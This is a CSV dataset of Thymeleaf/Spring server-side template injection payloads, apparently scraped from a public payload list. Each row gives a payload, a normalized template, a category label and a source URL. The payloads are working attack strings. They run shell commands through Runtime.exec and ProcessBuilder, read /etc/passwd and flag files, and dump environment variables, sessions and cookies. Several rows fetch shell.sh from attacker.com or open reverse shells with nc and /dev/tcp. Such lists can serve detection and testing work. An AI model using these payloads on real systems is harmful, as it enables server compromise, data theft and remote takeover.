${T(java.lang.System).getenv('HOME')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getenv('USER')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getenv('SHELL')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.ProcessBuilder).start()},${t(java.lang.processbuilder).start()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.lang.ProcessBuilder('id').start()},${newjava.lang.processbuilder('S').start()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.lang.ProcessBuilder('whoami').start()},${newjava.lang.processbuilder('S').start()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('cat','/etc/passwd').start()}","${newjava.lang.processbuilder('S','S').start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('ls','-la').start()}","${newjava.lang.processbuilder('S','S').start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('uname','-a').start()}","${newjava.lang.processbuilder('S','S').start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('bash','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('sh','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('/bin/sh','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('/bin/bash','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder(new String[]{'sh','-c','id'}).start()}","${newjava.lang.processbuilder(newstring[]{'S','S','S'}).start()}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Class).forName('java.lang.Runtime').getRuntime().exec('id')},${t(java.lang.class).forname('S').getruntime().exec('S')},java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Class).forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}","${t(java.lang.class).forname('S').getmethod('S',null).invoke(null,null).exec('S')}",java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Class).forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance('id').start()},${t(java.lang.class).forname('S').getdeclaredconstructors()[N].newinstance('S').start()},java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())},${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'}).getInputStream())}","${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'}).getinputstream())}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'}).getInputStream())}","${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'}).getinputstream())}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#strings.toString(T(java.lang.Runtime).getRuntime().exec('id'))},${#strings.tostring(t(java.lang.runtime).getruntime().exec('S'))},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#request.getSession().getServletContext().getContextPath()},${#request.getsession().getservletcontext().getcontextpath()},java,Thymeleaf,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext.getServerInfo()},${#servletcontext.getserverinfo()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext.getRealPath('/')},${#servletcontext.getrealpath('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext.getInitParameterNames()},${#servletcontext.getinitparameternames()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRequestURL()},${#httpservletrequest.getrequesturl()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRequestURI()},${#httpservletrequest.getrequesturi()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getQueryString()},${#httpservletrequest.getquerystring()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRemoteAddr()},${#httpservletrequest.getremoteaddr()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getRemoteHost()},${#httpservletrequest.getremotehost()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getHeader('User-Agent')},${#httpservletrequest.getheader('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getHeaderNames()},${#httpservletrequest.getheadernames()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getCookies()},${#httpservletrequest.getcookies()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpServletRequest.getSession()},${#httpservletrequest.getsession()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpSession.getId()},${#httpsession.getid()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#httpSession.getAttributeNames()},${#httpsession.getattributenames()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('/etc/passwd'))},${t(java.nio.file.files).readalllines(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get('flag.txt'))},${t(java.nio.file.files).readalllines(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))},${t(java.nio.file.files).readstring(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('flag.txt'))},${t(java.nio.file.files).readstring(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).lines(T(java.nio.file.Paths).get('/etc/passwd'))},${t(java.nio.file.files).lines(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).list(T(java.nio.file.Paths).get('/'))},${t(java.nio.file.files).list(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.nio.file.Files).walk(T(java.nio.file.Paths).get('/'))},${t(java.nio.file.files).walk(t(java.nio.file.paths).get('S'))},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.io.File).new('/etc/passwd').exists()},${t(java.io.file).new('S').exists()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/etc/passwd').exists()},${newjava.io.file('S').exists()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/etc/passwd').canRead()},${newjava.io.file('S').canread()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/').list()},${newjava.io.file('S').list()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('.').list()},${newjava.io.file('S').list()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.io.File('/').listFiles()},${newjava.io.file('S').listfiles()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('wget http://attacker.com/shell.sh -O /tmp/shell.sh')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/shell.sh -o /tmp/shell.sh')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('nc attacker.com 4444 -e /bin/bash')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(javax.script.ScriptEngineManager).new().getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(""id"")')}",${t(javax.script.scriptenginemanager).new().getenginebyname('S').eval('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(javax.script.ScriptEngineManager).new().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec(""id"")')}",${t(javax.script.scriptenginemanager).new().getenginebyname('S').eval('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(javax.script.ScriptEngineManager).new().getEngineByName('nashorn').eval('java.lang.Runtime.getRuntime().exec(""id"")')}",${t(javax.script.scriptenginemanager).new().getenginebyname('S').eval('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')},${'S'.getclass().forname('S').getruntime().exec('S')},java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('id')},${'S'.getclass().forname('S').getmethods()[N].invoke('S'.getclass().forname('S')).exec('S')},java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${applicationScope},${applicationscope},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${requestScope},${requestscope},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${sessionScope},${sessionscope},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${param},${param},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#ctx},${#ctx},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#vars},${#vars},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#locale},${#locale},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#request},${#request},java,Thymeleaf,1,enumeration,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#response},${#response},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#session},${#session},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${#servletContext},${#servletcontext},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
*{T(java.lang.Runtime).getRuntime().exec('id')},*{t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
*{T(java.lang.System).getProperty('user.name')},*{t(java.lang.system).getproperty('S')},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
*{new java.lang.ProcessBuilder('id').start()},*{newjava.lang.processbuilder('S').start()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
__${new java.lang.ProcessBuilder('id').start()}__::.x,__${newjava.lang.processbuilder('S').start()}__::.x,java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('cat$IFS/etc/passwd')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat</etc/passwd'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat<flag.txt'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Class).forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(""var x=new java.lang.ProcessBuilder;x.command('id');x.start()"")}","${t(java.lang.class).forname('S').newinstance().getenginebyname('S').eval(""S"")}",java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Class).forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(""java.lang.Runtime.getRuntime().exec('id')"")}","${t(java.lang.class).forname('S').newinstance().getenginebyname('S').eval(""S"")}",java,Thymeleaf,1,introspection,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec('S').getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec('S').getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec('S').getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'}).getInputStream(),T(java.nio.charset.Charset).defaultCharset())}","${t(org.springframework.util.streamutils).copytostring(t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'}).getinputstream(),t(java.nio.charset.charset).defaultcharset())}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${@beans},${@beans},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${@systemEnvironment},${@systemenvironment},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${@applicationContext},${@applicationcontext},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.springframework.cglib.core.ReflectUtils).defineClass('Exploit',T(org.apache.commons.codec.binary.Base64).decodeBase64('yv66vg...'),new java.net.URLClassLoader(new java.net.URL[0])).newInstance()}","${t(org.springframework.cglib.core.reflectutils).defineclass('S',t(org.apache.commons.codec.binary.baseN).decodebaseN('S'),newjava.net.urlclassloader(newjava.net.url[N])).newinstance()}",java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.net.URLClassLoader).newInstance(T(java.net.URL).newInstance('http://attacker.com/')).loadClass('Exploit').newInstance()},${t(java.net.urlclassloader).newinstance(t(java.net.url).newinstance('S')).loadclass('S').newinstance()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().availableProcessors()},${t(java.lang.runtime).getruntime().availableprocessors()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().freeMemory()},${t(java.lang.runtime).getruntime().freememory()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().totalMemory()},${t(java.lang.runtime).getruntime().totalmemory()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().maxMemory()},${t(java.lang.runtime).getruntime().maxmemory()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Thread).currentThread()},${t(java.lang.thread).currentthread()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Thread).getAllStackTraces()},${t(java.lang.thread).getallstacktraces()},java,Thymeleaf,1,uncertain,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getName()},${t(java.lang.management.managementfactory).getruntimemxbean().getname()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getInputArguments()},${t(java.lang.management.managementfactory).getruntimemxbean().getinputarguments()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.management.ManagementFactory).getRuntimeMXBean().getSystemProperties()},${t(java.lang.management.managementfactory).getruntimemxbean().getsystemproperties()},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(T(org.apache.commons.lang3.StringUtils).join(new String[]{'sh','-c','id'},' '))}","${t(java.lang.runtime).getruntime().exec(t(org.apache.commons.langN.stringutils).join(newstring[]{'S','S','S'},'S'))}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.beans.Beans).instantiate(null,'javax.script.ScriptEngineManager').getEngineByName('JavaScript').eval('java.lang.Runtime.getRuntime().exec(""id"")')}","${t(java.beans.beans).instantiate(null,'S').getenginebyname('S').eval('S')}",java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')},${t(java.lang.classloader).getsystemclassloader().loadclass('S').getmethod('S').invoke(null).exec('S')},java,Thymeleaf,1,direct-execution,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
